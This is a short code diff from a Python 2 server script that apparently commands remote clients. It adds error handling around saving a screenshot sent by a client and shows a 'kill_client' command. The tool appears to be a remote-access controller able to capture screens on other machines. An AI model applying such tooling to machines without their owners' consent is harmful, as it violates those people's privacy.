@@ -319,10 +319,13 @@ if __name__ == '__main__':
                             if not os.path.isdir(output_folder):
                                 os.mkdir(output_folder)
 
-                            with open(output_file, "w") as open_file:
-                                open_file.write(base64.b64decode(response))
+                            try:
+                                with open(output_file, "w") as open_file:
+                                    open_file.write(base64.b64decode(response))
 
-                            print MESSAGE_INFO + "Screenshot saved to: {0}".format(output_file)
+                                print MESSAGE_INFO + "Screenshot saved to: {0}".format(output_file)
+                            except TypeError:
+                                print MESSAGE_ATTENTION + "Failed to get screenshot (client in sleep mode?)."
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing client..."
                             response = server.current_client.send_command("kill_client")
